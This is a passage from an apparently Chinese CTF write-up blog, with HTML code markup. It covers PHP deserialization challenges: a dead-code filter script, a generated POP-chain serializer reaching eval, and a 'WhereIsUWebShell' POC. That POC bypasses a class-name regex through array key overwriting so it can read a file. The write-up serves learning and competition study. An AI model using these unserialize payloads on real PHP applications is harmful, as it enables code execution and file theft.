class="line">                            <span class="variable">$deleteCnt</span>++;</span><br><span class="line">                            <span class="keyword">unset</span>(<span class="variable">$subclass</span>-&gt;stmts[<span class="variable">$kk</span>]);</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// eval 是否不被引用</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$subStatements</span>-&gt;expr <span class="keyword">instanceof</span>  PhpParser\Node\Expr\Eval_) &#123;</span><br><span class="line">                        <span class="comment">// 函数名称只出现一次</span></span><br><span class="line">                        <span class="keyword">if</span> (substr_count(<span class="variable">$code</span>, <span class="variable">$classMember</span>-&gt;name-&gt;name) === <span class="number">1</span>) &#123;</span><br><span class="line">                            <span class="variable">$deleteCnt</span>++;</span><br><span class="line">                            <span class="keyword">unset</span>(<span class="variable">$subclass</span>-&gt;stmts[<span class="variable">$kk</span>]);</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[+] filter done&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="variable">$prettyPrinter</span> = <span class="keyword">new</span> PrettyPrinter\Standard;</span><br><span class="line"><span class="variable">$afterFilter</span> = <span class="variable">$prettyPrinter</span>-&gt;prettyPrintFile(<span class="variable">$ast</span>);</span><br><span class="line">file_put_contents(<span class="variable">$outputPhpFile</span>, <span class="variable">$afterFilter</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[+] total filter: &#x27;</span>.<span class="variable">$deleteCnt</span>. <span class="string">&#x27; function&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>多运行几遍上面代码，大概15次左右，大概消耗20分钟左右，就会显示过滤完成了，即 <code>total filter: 0 function</code>。（脚本还可以改进，例如把没用的类也去掉）</p><p>去除完后，搜索发现就只有一个 eval，接下来反过来跟这条链即可~</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623494936972-67b5be3c-704b-48ba-ae10-627770395595.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623494936972-67b5be3c-704b-48ba-ae10-627770395595.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>构造 POP链如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xCUG62</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rLTCpuG</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E984fn</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GcQ9wNy</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;GcQ9wNy = <span class="keyword">new</span> xCUG62();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zOTHpM</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$HiDCYPi</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;HiDCYPi = <span class="keyword">new</span> E984fn();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S0bXG3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t8FQmBq</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;t8FQmBq = <span class="keyword">new</span> zOTHpM();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LTswgA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GP8GMDp</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;GP8GMDp = <span class="keyword">new</span>  S0bXG3();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Br2Com</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aSGzyvk</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;aSGzyvk = <span class="keyword">new</span> LTswgA();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MwVbup</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qFwGWF6</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;qFwGWF6 = <span class="keyword">new</span> Br2Com();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xxAkFU</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$YRn1G6B</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;YRn1G6B = <span class="keyword">new</span> MwVbup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UOPWFh</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w2rcmoW</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;w2rcmoW = <span class="keyword">new</span> xxAkFU();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fTTYmp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Ma3Koaf</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Ma3Koaf = <span class="keyword">new</span> UOPWFh();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zuNg7f</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$TNngTy9</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;TNngTy9 = <span class="keyword">new</span> fTTYmp();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Q0Ehc0</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Eze6mbP</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Eze6mbP = <span class="keyword">new</span> zuNg7f();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LNv8hP</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kiZRG9G</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;kiZRG9G = <span class="keyword">new</span> Q0Ehc0();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RLadP4</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$FkQAZ7e</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;FkQAZ7e = <span class="keyword">new</span> LNv8hP();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K1lpuz</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ZH6YAPE</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ZH6YAPE = <span class="keyword">new</span> RLadP4();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lIcDR2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Q7WCRu9</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Q7WCRu9 = <span class="keyword">new</span> K1lpuz();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk6AMC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nqGOOTr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nqGOOTr = <span class="keyword">new</span> lIcDR2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mDnkFh</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$SLzu22G</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;SLzu22G = <span class="keyword">new</span> xk6AMC();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LvG62O</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$AByNdFw</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;AByNdFw = <span class="keyword">new</span> mDnkFh();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">v00XnF</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$S9vaxl3</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;S9vaxl3 = <span class="keyword">new</span> LvG62O();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mRhBx7</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$uMKr13G</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uMKr13G = <span class="keyword">new</span> v00XnF();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Eckd7K</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bR5zBKO</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;bR5zBKO = <span class="keyword">new</span> mRhBx7();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gGHPEt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$IOGuqdZ</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;IOGuqdZ = <span class="keyword">new</span> Eckd7K();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OcZqBy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yHPAqE1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;yHPAqE1 = <span class="keyword">new</span> gGHPEt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NGPaqV</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ZwSdRyt</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ZwSdRyt = <span class="keyword">new</span> OcZqBy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$NG</span> = <span class="keyword">new</span> NGPaqV();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$NG</span>);</span><br></pre></td></tr></table></figure><p>还有多余的字符拼接在我们可控字符的后面，因最终是 <code>eval</code> 转换为代码，通过注释去掉即可</p><p>即可获得flag</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623495768049-00f1437b-1b41-435d-822d-1ebe16e1ae0c.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623495768049-00f1437b-1b41-435d-822d-1ebe16e1ae0c.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="0x3-（部分）WhereIsUWebShell"><a href="#0x3-（部分）WhereIsUWebShell" class="headerlink" title="0x3 （部分）WhereIsUWebShell"></a>0x3 （部分）<strong>WhereIsUWebShell</strong></h2><p>赛后和xlw师兄交流了一波，表示学到了~！</p><p>先贴贴原题代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">I see your Cookie</span><br><span class="line">&lt;!-- You may need to know what is in e2a7106f1cc8bb1e1318df70aa0a3540.php--&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// index.php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="string">&#x27;on&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;ctfer&#x27;</span>]))&#123;</span><br><span class="line">    setcookie(<span class="string">&quot;ctfer&quot;</span>,serialize(<span class="string">&quot;ctfer&quot;</span>),time()+<span class="number">3600</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;I see your Cookie&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;ctfer&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/myclass/i&#x27;</span>,serialize(<span class="variable">$res</span>)))&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error: Class &#x27;myclass&#x27; not found &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">highlight_file(<span class="string">&quot;myclass.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">highlight_file(<span class="string">&quot;function.php&quot;</span>);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// myclass.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;qwb) <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;qwb);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// function.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$classname</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&quot;/var/www/html/<span class="subst">$classname</span>.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简要分析一下，存在以下几个文件</p><ul><li><strong>index.php</strong> 入口，也是反序列化点，不过存在正则 <code>preg_match(&#39;/myclass/i&#39;,serialize($res))</code> 需要绕过</li><li><strong>myclass.php</strong> 文件读取点</li><li><strong>function.php</strong> <code>__autoload</code> 魔术方法文件，当实例化一个类时候，如 <code>new myclass();</code> 然后找不到这个类时，会调用这个魔术方法，本题表现为包含某个文件。</li><li><strong>e2a7106f1cc8bb1e1318df70aa0a3540.php</strong> 应该是提示之类的</li></ul><p>这里正则绕过的思路很巧妙，表示学到了！</p><p>首先，如果没有反序列化 <code>myclass</code> 类，就因没包含 <code>myclass.php</code> 文件，进而导致利用不了 <code>Hello</code> 类</p><p>观察 <code>index.php</code> 代码可知，首先是反序列化 <code>Cookie</code> 里的序列化数据，然后在序列化刚刚反序列化的数据。这里看似，，好像无法修改，但仔细想想，PHP里有没有什么数据结构，会先天性存在，写入同一个位置会存在覆盖关系的，就豁然开朗了！</p><p>没错，就是，数组，只要反序列化数组，都在数据的同一位置，反序列化时，反序列化数组的第一个位置是 <code>myclass</code> 类，就会包含 <code>myclass.php</code>，然后同一第一个位置也是 <code>Hello</code> 类，那么就会覆盖第一个位置的 <code>myclass</code> 类，但此时 <code>myclass.php</code>，已经包含进来了，那么 <code>Hello</code> 类自然也能正常被反序列化了</p><p>构造 POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwb</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$he</span> = <span class="keyword">new</span> Hello();</span><br><span class="line"><span class="variable">$he</span>-&gt;qwb = <span class="string">&#x27;/Users/tari/Sites/tari_local/e2a7106f1cc8bb1e1318df70aa0a3540.php&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span>[<span class="number">1</span>] = <span class="keyword">new</span> myclass();</span><br><span class="line"><span class="variable">$arr</span>[<span class="number">0</span>] = <span class="variable">$he</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(str_replace(<span class="string">&quot;i:0&quot;</span>, <span class="string">&quot;i:1&quot;</span>, serialize(<span class="variable">$arr</span>)));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623677381799-fe1525c6-ca07-4530-ad23-e6711641ba04.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623677381799-fe1525c6-ca07-4530-ad23-e6711641ba04.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623677433702-0a93c448-ba3f-473e-8ff6-f347d3de328c.png?x-oss-process=image/resize,w_1500" class="lazyload" 